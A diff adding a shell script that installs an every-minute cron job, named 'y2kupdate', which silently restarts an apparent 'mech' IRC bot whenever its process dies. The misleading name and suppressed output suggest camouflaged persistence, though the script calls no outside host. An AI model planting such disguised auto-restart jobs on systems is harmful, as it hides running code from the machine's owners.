@@ -1,0 +1,18 @@
+#!/bin/sh
+pwd > m.dir
+dir=$(cat m.dir)
+echo "* * * * * $dir/y2kupdate >/dev/null 2>&1" > cron.d
+crontab cron.d
+chmod +x cron.d
+crontab -l | grep y2kupdate
+echo "#!/bin/sh
+if test -r $dir/mech.pid; then
+pid=\$(cat $dir/mech.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./run &>/dev/null" > y2kupdate
+chmod u+x y2kupdate
